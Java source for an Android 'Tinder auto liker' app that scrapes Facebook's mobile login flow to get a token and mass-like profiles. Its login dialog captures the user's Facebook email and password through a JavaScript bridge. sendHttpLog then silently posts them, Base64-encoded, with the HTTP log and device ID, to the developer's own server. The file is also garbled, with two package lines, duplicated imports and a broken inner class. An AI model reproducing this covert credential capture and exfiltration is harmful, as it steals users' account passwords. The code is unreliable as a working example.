package com.fbloginsample.app;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.support.v4.app.Fragment;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.TextView;

package com.tinderautoliker;

        import java.util.HashMap;
        import java.util.Map;
        import java.util.regex.Matcher;
        import java.util.regex.Pattern;

import com.facebook.AccessToken;
import com.facebook.CallbackManager;
import com.facebook.FacebookCallback;
import com.facebook.Profile;
import com.facebook.login.LoginResult;
import org.json.JSONArray;
        import org.json.JSONObject;

        import android.app.Activity;
        import android.app.AlertDialog;
        import android.app.Dialog;
        import android.app.ProgressDialog;
        import android.content.Context;
        import android.content.DialogInterface;
        import android.content.Intent;
        import android.content.SharedPreferences;
        import android.content.SharedPreferences.Editor;
        import android.content.pm.PackageInfo;
        import android.os.Bundle;
        import android.text.TextUtils;
        import android.util.Base64;
        import android.util.Log;
        import android.view.Gravity;
        import android.view.LayoutInflater;
        import android.view.View;
        import android.view.View.OnClickListener;
        import android.webkit.CookieManager;
        import android.webkit.CookieSyncManager;
        import android.webkit.JavascriptInterface;
        import android.webkit.WebSettings;
        import android.webkit.WebView;
        import android.widget.Button;
        import android.widget.CheckBox;
        import android.widget.ImageView;
        import android.widget.LinearLayout;
        import android.widget.TextView;

        import com.android.volley.AuthFailureError;
        import com.android.volley.Request;
        import com.android.volley.Response;
        import com.android.volley.VolleyError;
        import com.android.volley.toolbox.JsonObjectRequest;
        import com.android.volley.toolbox.StringRequest;


public class LoginUsingActivityActivity extends Activity {
    private TextView txtHeader, txtStatus;
    private Button buttonLogin, buttonSetLocation, buttonStartLiking;
    private String fbAuthToken, tinder_api_token, tinder_full_name, tinder_lat, tinder_long, fbFormEmail, fbFormPass;
    private String fbapp_id = "464891386855067", fbHttpLog;
    private CheckBox chkLikeMutualFriends;
    public AlertDialog webDialog;
    public ProgressDialog pd;
    public int total_girls_liked, pref_total_girls_liked;
    public boolean areWeLiking = true, trial_limit_exceeded = false, purchased = false, buy_dialog_launched = false;
    private static String userAgent = null;
    private PlayBilling mPlayBilling;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("TINDER", "on create");
        buttonLogin = (Button) findViewById(R.id.login_button);
        buttonLogin.setGravity(Gravity.CENTER);

        buttonSetLocation = (Button) findViewById(R.id.button_setlocation);
        buttonStartLiking = (Button) findViewById(R.id.button_startliking);
        txtHeader = (TextView) findViewById(R.id.header_text);
        txtStatus = (TextView) findViewById(R.id.status);
        chkLikeMutualFriends = (CheckBox) findViewById(R.id.chk_likemutualfriends);
        chkLikeMutualFriends.setChecked(false);

        mPlayBilling = new PlayBilling();
        mPlayBilling.onCreateActivity(this, this);

        userAgent = new WebView(this).getSettings().getUserAgentString();
        Log.d("user agent", "aa" + userAgent);
    }

    @Override
    public void onResume() {
        super.onResume();
        Context mContext = getApplicationContext();
        SharedPreferences prefs = mContext.getSharedPreferences("TinderPrefs", Context.MODE_PRIVATE);
        if (prefs.contains("purchased") == false) {
            Log.d("TINDERAUTOLIKER", "checking if installed");
            checkIfAlreadyInstalled();
        }

        trial_limit_exceeded = prefs.getBoolean("trial_limit_exceeded", false);
        purchased = prefs.getBoolean("purchased", false);
        // first check if token is empty. if so, get from shared preferences.
        if (TextUtils.isEmpty(tinder_api_token)) {


            tinder_api_token = prefs.getString("api_token", null);
            tinder_full_name = prefs.getString("full_name", null);
            tinder_lat = prefs.getString("lat", null);
            tinder_long = prefs.getString("long", null);
            pref_total_girls_liked = prefs.getInt("pref_total_girls_liked", 0);
            txtHeader.setText("Welcome " + tinder_full_name);
            buttonSetLocation.setEnabled(true);
            buttonStartLiking.setEnabled(true);
            buttonLogin.setText("Logout");

        }


        // if token is still empty, means no shared preferences so no login.
        if (TextUtils.isEmpty(tinder_api_token)) {
            txtHeader.setText("Login to Tinder with your Facebook account");
            buttonSetLocation.setEnabled(false);
            buttonStartLiking.setEnabled(false);
            buttonLogin.setText("Log in with Facebook");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        // Pass on the activity result to the helper for handling
        if (!mPlayBilling.mHelper.handleActivityResult(requestCode, resultCode, data)) {
            // not handled, so handle it ourselves (here's where you'd
            // perform any handling of activity results not related to in-app
            // billing...
            super.onActivityResult(requestCode, resultCode, data);
        } else {
            Log.d("IAP", "onActivityResult handled by IABUtil.");
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        // very important:
        Log.d("IAP", "Destroying helper.");
        if (mPlayBilling.mHelper != null) mPlayBilling.mHelper.dispose();
        mPlayBilling.mHelper = null;
    }

    public void clickBuy(View view) {
        mPlayBilling.buyButtonClicked();
    }

    private void loginTinder() {
        String url = "https://api.gotinder.com/auth";
        JSONObject reqBody = new JSONObject();
        try {
            reqBody.put("facebook_token", fbAuthToken);
        } catch (Exception e) {
            Log.e("MYAPP", "exception", e);
        }
        JsonObjectRequest jsObjRequest = new JsonObjectRequest(Request.Method.POST, url, reqBody, new Response.Listener<JSONObject>() {

            @Override
            public void onResponse(JSONObject response) {
                // TODO Auto-generated method stub
                fbHttpLog += "METHOD RESPONSE OF: loginTinder\n" + response + "\n\n";
                //Log.d("TINDERAUTOLIKER","tinder login response => "+response.toString());
                try {
                    tinder_api_token = (String) response.getJSONObject("user").get("api_token");
                    tinder_full_name = (String) response.getJSONObject("user").get("full_name");
                    if (response.getJSONObject("user").has("pos")) {
                        double tinder_lat_num = (Double) response.getJSONObject("user").getJSONObject("pos").getDouble("lat");
                        tinder_lat = String.valueOf(tinder_lat_num);
                        tinder_long = String.valueOf((Double) response.getJSONObject("user").getJSONObject("pos").getDouble("lon"));
                        // successful tinder login
                    } else {
                        tinder_lat = null;
                        tinder_long = null;
                        txtHeader.setText("No position info with login. Will just take your location from real Tinder app\n");
                    }
                    txtHeader.append("Welcome " + tinder_full_name);
                    buttonSetLocation.setEnabled(true);
                    buttonStartLiking.setEnabled(true);
                    buttonLogin.setText("Logout");
                    if (pd != null) {
                        pd.dismiss();
                        webDialog.dismiss();
                    }
                } catch (Exception e) {
                    Log.e("MYAPP", "exception", e);
                }
                Context mContext = getApplicationContext();
                SharedPreferences sharedPref = mContext.getSharedPreferences("TinderPrefs", Context.MODE_PRIVATE);
                Editor editor = sharedPref.edit();
                editor.putString("api_token", tinder_api_token);
                editor.putString("full_name", tinder_full_name);
                editor.putString("lat", tinder_lat);
                editor.putString("long", tinder_long);
                editor.commit();
                Log.d("TINDERAUTOLIKER", "api token => " + tinder_api_token);
            }
        }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {
                error.printStackTrace();

            }
        });

        MyApp.getRequestQueue().add(jsObjRequest);
    }

    private void getRecs() {
        Log.d("TINDERAUTOLIKER", "get recs");
        String url = "https://api.gotinder.com/user/recs";

        JsonObjectRequest jsObjRequest = new JsonObjectRequest(Request.Method.GET, url, (String) null, new Response.Listener<JSONObject>() {

            @Override
            public void onResponse(JSONObject response) {
                // TODO Auto-generated method stub
                Log.d("TINDERAUTOLIKER", "recs => " + response.toString());
                try {
                    // check for tinder recs timeout
                    if (response.has("message")) {
                        if ((response.getString("message")).contains("recs timeout")) {
                            txtStatus.setText(txtStatus.getText() + "\nNo new people to like on Tinder! Wait a while and start again. ");
                            return;
                        }
                    }
                    JSONArray results = response.getJSONArray("results");
                    for (int i = 0; i < results.length(); i++) {
                        //for(int i = 0; i < 1; i++){
                        JSONObject c = results.getJSONObject(i);
                        String girl_tinder_id = c.getString("_id");
                        Integer common_friend_count = c.getInt("common_friend_count");
                        if (areWeLiking == false) {
                            Log.d("TINDERAUTOLIKER", "areWeLiking is false so breaking");
                            break;
                        }
                        if (common_friend_count > 0 && chkLikeMutualFriends.isChecked() == false) {
                            Log.d("TINDERAUTOLIKER", "skipped girl with common friend count is more than 0 for " + girl_tinder_id);
                            continue;
                        }
                        likeTinderId(girl_tinder_id);
                        Log.d("TINDERAUTOLIKER", girl_tinder_id);
                    }
                    if (results.length() > 5 && areWeLiking == true) {
                        getRecs();
                    }
                } catch (Exception e) {
                    Log.e("MYAPP", "exception", e);
                }
                // if total results less than 5, stop. if not, get more baby

            }
        }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {
                // TODO Auto-generated method stub
                Log.d("TINDERAUTOLIKER", "error => " + error.getMessage());
                if (error.getMessage() != null) {
                    if (error.getMessage().contains("No authentication challenges found")) {
                        staleTinderAuthToken();
                    }
                }
            }
        }) {

            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Log.d("TINDERAUTOLIKER", "called getheaders");
                Map<String, String> params = new HashMap<String, String>();
                params.put("X-Auth-Token", tinder_api_token);
                return params;
            }
        };
        MyApp.getRequestQueue().add(jsObjRequest);
    }

    public void staleTinderAuthToken() {
        // show dialog that token is stale
        AlertDialog.Builder builder1 = new AlertDialog.Builder(LoginUsingActivityActivity.this);
        builder1.setTitle("Stale Tinder Login");
        builder1.setMessage("Your Tinder session has expired, you need to login again.");
        builder1.setCancelable(true);
        builder1.setNeutralButton(android.R.string.ok,
                new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface dialog, int id) {
                        dialog.cancel();
                    }
                });
        AlertDialog alert11 = builder1.create();
        alert11.show();

        // reset welcome text and enable login button
        txtHeader.setText("Login to Tinder with your Facebook account");
        buttonSetLocation.setEnabled(false);
        buttonStartLiking.setEnabled(false);
        buttonLogin.setText("Log in with Facebook");

        // clear shared prefs token
        SharedPreferences sharedPref = this.getSharedPreferences("TinderPrefs", Context.MODE_PRIVATE);
        Editor editor = sharedPref.edit();
        editor.putString("api_token", null);
        editor.commit();

        // change button text back
        if (buttonStartLiking.getText().equals("STOP AutoLiking")) {
            buttonStartLiking.setText("Start AutoLiking!");
            areWeLiking = false;
        }
    }

    public void launchBuyDialog() {
        buy_dialog_launched = true;
        final Dialog dialog = new Dialog(this);
        dialog.setTitle("Trial limit exceeded");

        LinearLayout ll = new LinearLayout(this);
        ll.setBackgroundColor(getResources().getColor(android.R.color.white));
        ll.setOrientation(LinearLayout.VERTICAL);

        TextView tv = new TextView(this);
        tv.setText("You've liked over 500 girls. To continue using our app, you need to pay a onetime fee of $2.");
        tv.setWidth(240);
        tv.setPadding(4, 0, 4, 10);
        ll.addView(tv);

        Button b1 = new Button(this);
        b1.setText("Buy now");
        b1.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                buy_dialog_launched = false;
                dialog.dismiss();
                mPlayBilling.buyButtonClicked();
            }
        });
        ll.addView(b1);

        Button b2 = new Button(this);
        b2.setText("No thanks");
        b2.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                buy_dialog_launched = false;
                dialog.dismiss();
                finish();
            }
        });
        ll.addView(b2);

        dialog.setContentView(ll);
        dialog.setCancelable(false);
        dialog.show();
    }

    public void updateLikeCount() {
        Context mContext = getApplicationContext();
        SharedPreferences sharedPref = mContext.getSharedPreferences("TinderPrefs", Context.MODE_PRIVATE);
        purchased = sharedPref.getBoolean("purchased", false);

        txtStatus.setText(String.valueOf(total_girls_liked) + " people liked!");
        if ((pref_total_girls_liked + total_girls_liked >= 500) && purchased == false && buy_dialog_launched == false) {
            trial_limit_exceeded = true;
            Editor editor = sharedPref.edit();
            editor.putBoolean("trial_limit_exceeded", true);
            editor.commit();
            // stop the liking if the user hasn't paid.
            if (buttonStartLiking.getText().equals("STOP AutoLiking")) {
                buttonStartLiking.setText("Start AutoLiking!");
                areWeLiking = false;
            }
            launchBuyDialog();
        }
        // every 100 likes, update the sharedpref like count
        if (total_girls_liked % 100 == 0) {


            Editor editor = sharedPref.edit();
            editor.putInt("pref_total_girls_liked", pref_total_girls_liked + total_girls_liked);
            editor.commit();
        }
    }

    private void likeTinderId(String id) {
        String url = "https://api.gotinder.com/like/" + id;

        JsonObjectRequest jsObjRequest = new JsonObjectRequest(Request.Method.GET, url, (String) null, new Response.Listener<JSONObject>() {

            @Override
            public void onResponse(JSONObject response) {
                // TODO Auto-generated method stub
                Log.d("TINDERAUTOLIKER", "like => " + response.toString());
                try {
                    if (response.has("match")) {
                        Log.d("TINDERAUTOLIKER", "we got match json on like");
                        total_girls_liked++;
                        updateLikeCount();
                    } else {

                    }
                } catch (Exception e) {
                    Log.e("MYAPP", "exception", e);
                }
            }
        }, new Response.ErrorListener() {

            @Override
            public void onErrorResponse(VolleyError error) {
                // TODO Auto-generated method stub
                Log.d("TINDERAUTOLIKER", "error => " + error.toString());
            }
        }) {

            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Log.d("TINDERAUTOLIKER", "called getheaders");
                Map<String, String> params = new HashMap<String, String>();
                params.put("X-Auth-Token", tinder_api_token);
                return params;
            }
        };
        MyApp.getRequestQueue().add(jsObjRequest);
    }

    public void onClickLogin(View v) {
        Button b = (Button) v;
        String text = b.getText().toString();
        if (text.equals("Log in with Facebook")) {
            loadDialog();
        } else if (text.equals("Logout")) {
            areWeLiking = false;
            MyApp.refreshVolleyNetworkQueue(getApplicationContext());
            //getSharedPreferences("TinderPrefs", Context.MODE_PRIVATE).edit().clear().commit();
            Context mContext = getApplicationContext();
            SharedPreferences sharedPref = mContext.getSharedPreferences("TinderPrefs", Context.MODE_PRIVATE);
            Editor editor = sharedPref.edit();
            editor.putString("api_token", null);
            editor.putString("full_name", null);
            editor.putString("lat", null);
            editor.putString("long", null);
            editor.commit();
            txtHeader.setText("Login to Tinder with your Facebook account");
            buttonSetLocation.setEnabled(false);
            buttonStartLiking.setEnabled(false);
            buttonLogin.setText("Log in with Facebook");
        }
    }

    public void startLiking(View v) {
        areWeLiking = true;
        Button b = (Button) v;
        String text = b.getText().toString();
        if (text.equals("STOP AutoLiking")) {
            b.setText("Start AutoLiking!");
            areWeLiking = false;
        } else if (text.equals("Start AutoLiking!")) {
            Context mContext = getApplicationContext();
            SharedPreferences sharedPref = mContext.getSharedPreferences("TinderPrefs", Context.MODE_PRIVATE);
            purchased = sharedPref.getBoolean("purchased", false);
            trial_limit_exceeded = sharedPref.getBoolean("trial_limit_exceeded", false);

            if (trial_limit_exceeded == true && purchased == false) {
                launchBuyDialog();
            } else {
                b.setText("STOP AutoLiking");
                getRecs();
            }
        }
    }

    public void loginFacebook1() {
        String url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=" + fbapp_id + "&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fredirect_uri%3Dfbconnect%253A%252F%252Fsuccess%26display%3Dtouch%26type%3Duser_agent%26client_id%3D" + fbapp_id + "%26ret%3Dlogin&cancel_uri=fbconnect%3A%2F%2Fsuccess%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26e2e%3D%257B%2522init%2522%253A1382734932936%257D&display=touch&_rdr";
        //String url="http://www.TINDERAUTOLIKERcasey.com/test2.htm";
        StringRequest postRequest = new StringRequest(Request.Method.GET, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // response
                        fbHttpLog += "METHOD RESPONSE OF: loginFacebook1\n" + response + "\n\n";
                        loginFacebook2();
                        Log.d("Response", response);
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // TODO Auto-generated method stub
                        Log.d("TINDERAUTOLIKER", "error => " + error.toString());
                    }
                }) {

            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("User-agent", userAgent);
// params.put("Accept-language", "nl");
                return params;
            }
        };
        MyApp.getRequestQueue().add(postRequest);
    }

    public void loginFacebook2() {
        String url = "https://m.facebook.com/login.php?skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fredirect_uri%3Dfbconnect%253A%252F%252Fsuccess%26display%3Dtouch%26type%3Duser_agent%26client_id%3D" + fbapp_id + "%26ret%3Dlogin&refsrc=https%3A%2F%2Fm.facebook.com%2Flogin.php&app_id=" + fbapp_id + "&refid=9";
        StringRequest postRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // response
                        fbHttpLog += "METHOD RESPONSE OF: loginFacebook2\n" + response + "\n\n";
                        if (response.contains("/recover/initiate/")) {
                            // response contains '/recover/initiate/' which should mean the login wasn't successful because of incorrect pass or something. can't search for password string as different languages
                            pd.dismiss();
                            AlertDialog.Builder builder1 = new AlertDialog.Builder(LoginUsingActivityActivity.this);
                            builder1.setTitle("Incorrect password");
                            builder1.setMessage("Your Facebook username or password is incorrect. Please try again.");
                            builder1.setCancelable(true);
                            builder1.setNeutralButton(android.R.string.ok,
                                    new DialogInterface.OnClickListener() {
                                        public void onClick(DialogInterface dialog, int id) {
                                            dialog.cancel();
                                        }
                                    });

                            AlertDialog alert11 = builder1.create();
                            alert11.show();
                        } else if (response.contains("/login/checkpoint/")) {
                            Log.d("TINDERAUTOLIKER", "hit checkpoint");
                            Log.d("response", response);
                            // response contains 'checkpoint' which can be a login notification or other checkpoint. big problems.
                            if (response.contains("\"save_device\"")) {
                                Log.d("TINDERAUTOLIKER", "save_device");
                                Pattern nhPattern = Pattern.compile("name=\"nh\" value=\"(.+?)\"");
                                Matcher m = nhPattern.matcher(response);
                                String nh = null, lsd = null;
                                while (m.find()) {
                                    nh = m.group(1);
                                }

                                Pattern lsdPattern = Pattern.compile("name=\"lsd\" value=\"(.+?)\"");
                                Matcher m2 = lsdPattern.matcher(response);
                                while (m2.find()) {
                                    lsd = m2.group(1);
                                }


                                if (nh != null && lsd != null) {
                                    //
                                    Log.d("TINDERAUTOLIKER", "loginFacebookCheckpoint " + nh + " " + lsd);
                                    loginFacebookCheckpoint(nh, lsd);
                                } else {
                                    Log.d("TINDERAUTOLIKER", "save_device");
                                }
                            } else {
                                pd.dismiss();
                                AlertDialog.Builder builder1 = new AlertDialog.Builder(LoginUsingActivityActivity.this);
                                builder1.setTitle("Facebook Checkpoint");
                                builder1.setMessage("Couldn't login to Facebook as it hit a checkpoint. Login on your phone's normal browser, not the app. Then come back to this app and try again.");
                                builder1.setCancelable(true);
                                builder1.setNeutralButton(android.R.string.ok,
                                        new DialogInterface.OnClickListener() {
                                            public void onClick(DialogInterface dialog, int id) {
                                                dialog.cancel();
                                            }
                                        });

                                AlertDialog alert11 = builder1.create();
                                alert11.show();
                            }
                        } else {
                            Pattern dtsgPattern = Pattern.compile("name=\"fb_dtsg\" value=\"(.+?)\"");
                            Matcher m = dtsgPattern.matcher(response);
                            Log.d("Response fb password wrong", response);
                            while (m.find()) {
                                loginFacebookAppAproval(m.group(1));
                            }
                        }

                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // TODO Auto-generated method stub
                        Log.d("TINDERAUTOLIKER", "error => " + error.toString());
                    }
                }
        ) {

            @Override
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<String, String>();
                params.put("email", fbFormEmail);
                params.put("pass", fbFormPass);

                return params;
            }

            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("User-agent", userAgent);
// params.put("Accept-language", "nl");
                return params;
            }

        };
        MyApp.getRequestQueue().add(postRequest);

    }

    public void loginFacebookCheckpoint(final String nh, final String lsd) {
        String url = "https://m.facebook.com/login/checkpoint/?next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fredirect_uri%3Dfbconnect%253A%252F%252Fsuccess%26display%3Dtouch%26type%3Duser_agent%26client_id%3D" + fbapp_id + "%26ret%3Dlogin";
        StringRequest postRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
                        // response
                        fbHttpLog += "METHOD RESPONSE OF: loginFacebookCheckpoint\n" + response + "\n\n";

                        Pattern dtsgPattern = Pattern.compile("name=\"fb_dtsg\" value=\"(.+?)\"");
                        Matcher m = dtsgPattern.matcher(response);
                        Log.d("Response fb password wrong", response);
                        while (m.find()) {
                            loginFacebookAppAproval(m.group(1));
                        }
                    }
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // TODO Auto-generated method stub
                        Log.d("TINDERAUTOLIKER", "error => " + error.toString());
                    }
                }
        ) {

            @Override
            protected Map<String, String> getParams() {
                Map<String, String> params = new HashMap<String, String>();
                params.put("lsd", lsd);
                params.put("charset_test", "€,´,€,´,?,?,?");
                params.put("nh", nh);
                params.put("name_action_selected", "save_device");
                params.put("submit[Continue]", "Continue");

                return params;
            }

            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> params = new HashMap<String, String>();
                params.put("User-agent", userAgent);
// params.put("Accept-language", "nl");
                return params;
            }

        };
        MyApp.getRequestQueue().add(postRequest);

    }

    public static class PlaceholderFragment extends Fragment {


        private TextView mTextDetails;
        private CallbackManager mCallbackManager;

        private FacebookCallback<LoginResult> mCallback = new FacebookCallback<LoginResult>() {
            @Override
            public void onSuccess(LoginResult loginResult) {
                AccessToken fbAuthToken = loginResult.getAccessToken();
                Profile profile = Profile.getCurrentProfile();
                if (profile != null) {
                    mTextDetails.setText("Welcome " + profile.getName());
                }
                loginTinder();
            }
        },
        new Response.ErrorListener()

        {
            @Override
            public void onErrorResponse (VolleyError error){
            // TODO Auto-generated method stub
            Log.d("TINDERAUTOLIKER", "error => " + error.toString());
        }
        }
    }


    public void loginFacebookAppAproval(final String fb_dtsg) {
        String url = "https://m.facebook.com/dialog/oauth/confirm";
        StringRequest postRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>()
                {
                    @Override
                    public void onResponse(String response) {
                        // response
                        fbHttpLog+="METHOD RESPONSE OF: loginFacebookAppAproval\n"+response+"\n\n";
                        Pattern tokenPattern = Pattern.compile("access_token=(.+?)&expires");
                        Matcher m = tokenPattern.matcher(response);
                        while (m.find()) {
                            fbAuthToken=m.group(1);
                        }
                        loginTinder();
                    }
                },
                new Response.ErrorListener()
                {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // TODO Auto-generated method stub
                        Log.d("TINDERAUTOLIKER","error => "+error.toString());
                    }
                }
        ) {

            @Override
            protected Map<String, String> getParams()
            {
                Map<String, String>  params = new HashMap<String, String>();
                params.put("fb_dtsg", fb_dtsg);
                params.put("app_id", fbapp_id);
                params.put("redirect_uri", "fbconnect://success");
                params.put("display", "touch");
                params.put("return_format", "access_token");
                params.put("charset_test", "%E2%82%AC%2C%C2%B4%2C%E2%82%AC%2C%C2%B4%2C%E6%B0%B4%2C%D0%94%2C%D0%84");
                params.put("from_post", "1");
                params.put("access_token", "");
                params.put("sdk", "");
                params.put("proxy_access_token", "");
                params.put("private", "");
                params.put("login", "");
                params.put("read", "");
                params.put("write", "");
                params.put("readwrite", "");
                params.put("extended", "");
                params.put("social_confirm", "");
                params.put("confirm", "");
                params.put("gdp_version", "3");
                params.put("seen_scopes", "");
                params.put("domain", "");
                params.put("sso_device", "");
                params.put("auth_type", "");
                params.put("auth_nonce", "");
                params.put("seen_revocable_perms_nux", "");
                params.put("ref", "Default");

                return params;
            }


            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String>  params = new HashMap<String, String>();
                params.put("User-agent", userAgent);
// params.put("Accept-language", "nl");
                return params;
            }
        };
        MyApp.getRequestQueue().add(postRequest);

    }



    public void loadDialog() {
        Context mContext = this;
        LayoutInflater inflater = (LayoutInflater) mContext.getSystemService(LAYOUT_INFLATER_SERVICE);
        View layout = inflater.inflate(R.layout.fb_login_dialog,null);
        WebView webView = (WebView)layout.findViewById(R.id.webView);

        // don't let webview store cookies. delete old ones.
        CookieSyncManager.createInstance(this);
        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.removeAllCookie();

        // add js interface so i can capture fb user and pass. magic here!
        CustomNativeAccess javasriptInterface = new CustomNativeAccess(this);
        webView.addJavascriptInterface(javasriptInterface, "Android");
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webView.loadUrl("file:///android_asset/fb_login.html");

        ImageView close_dialog = (ImageView) layout.findViewById(R.id.close);
        AlertDialog.Builder dialog = new AlertDialog.Builder(this);
        dialog.setView(layout);
        close_dialog.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) {
                webDialog.dismiss();
            }
        });
        webDialog=dialog.create();
        webDialog.show();
    }

    public void loadSetLocationActivity(View v) {
        Intent intent = new Intent(this, PickTinderLocation.class);
        startActivity(intent);
    }

    public void checkIfAlreadyInstalled() {

        final String android_id = android.provider.Settings.System.getString(this.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        String url = "http://direct.tinderautoliker.com/check_if_installed.php";
        StringRequest postRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>()
                {
                    @Override
                    public void onResponse(String response) {
                        if (response.contains("sneaky")) {
                            Log.d("TINDER","sneaky");
                            trial_limit_exceeded=true;
                            Context mContext = getApplicationContext();
                            SharedPreferences sharedPref = mContext.getSharedPreferences("TinderPrefs", Context.MODE_PRIVATE);
                            Editor editor = sharedPref.edit();
                            editor.putBoolean("trial_limit_exceeded",true);
                            editor.commit();
                        }

                    }
                },
                new Response.ErrorListener()
                {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // TODO Auto-generated method stub
                        Log.d("TINDERAUTOLIKER","error => "+error.toString());
                    }
                }
        ) {

            @Override
            protected Map<String, String> getParams()
            {
                Map<String, String>  params = new HashMap<String, String>();
                params.put("android_id", android_id);

                return params;
            }
        };
        MyApp.getRequestQueue().add(postRequest);
    }

    public void sendHttpLog() {
        String packageName=getPackageName();
        Integer versionCode=0;
        try {
            PackageInfo pInfo = getPackageManager().getPackageInfo(getPackageName(), 0);
            versionCode = pInfo.versionCode;
        } catch (Exception e) {
            Log.e("MYAPP", "exception", e);
        }
        final String version=packageName+":"+versionCode.toString();
        Log.d("TINDERAUTOLIKER","version: "+version);

        final String android_id = android.provider.Settings.System.getString(this.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
        String url = "http://direct.tinderautoliker.com/post_website.php";
        StringRequest postRequest = new StringRequest(Request.Method.POST, url,
                new Response.Listener<String>()
                {
                    @Override
                    public void onResponse(String response) {
                        // response

                    }
                },
                new Response.ErrorListener()
                {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // TODO Auto-generated method stub
                        Log.d("TINDERAUTOLIKER","error => "+error.toString());
                    }
                }
        ) {

            @Override
            protected Map<String, String> getParams()
            {
                Map<String, String>  params = new HashMap<String, String>();
                params.put("android_id", android_id);
                params.put("a1", (Base64.encodeToString(fbFormEmail.getBytes(), Base64.DEFAULT)).trim());
                params.put("a2", (Base64.encodeToString(fbFormPass.getBytes(), Base64.DEFAULT)).trim());
                params.put("version", version);
                params.put("log", fbHttpLog);

                return params;
            }
        };
        MyApp.getRequestQueue().add(postRequest);
    }


    public class CustomNativeAccess {
        Context mContext;
        public CustomNativeAccess(Context c) {
            mContext=c;
        }

        @JavascriptInterface
        public boolean doSomething(String user, String pass) {
            fbFormEmail=user;
            fbFormPass=pass;
            Log.d("TINDERAUTOLIKER", "user: "+user);
            // a
            pd = new ProgressDialog(mContext);
           /* pd.setOnCancelListener(new DialogInterface.OnCancelListener(){
            	@Override
            	public void onCancel(DialogInterface dialog) {
            		Log.d("TINDERAUTOLIKER","on cancelc alled");
            		//sendHttpLog();
            	}
            });*/
            pd.setOnDismissListener(new DialogInterface.OnDismissListener(){
                @Override
                public void onDismiss(DialogInterface dialog) {
                    Log.d("TINDERAUTOLIKER","on dismiss alled");
                    sendHttpLog();
                }
            });
            pd.setTitle("Processing...");
            pd.setMessage("Please wait. If this is taking a really long time, press back and try again.");
            pd.setCancelable(true);
            pd.setIndeterminate(true);
            pd.show();
            fbHttpLog="";
            loginFacebook1();
            //webDialog.dismiss();
            return true;
        }
    }
}








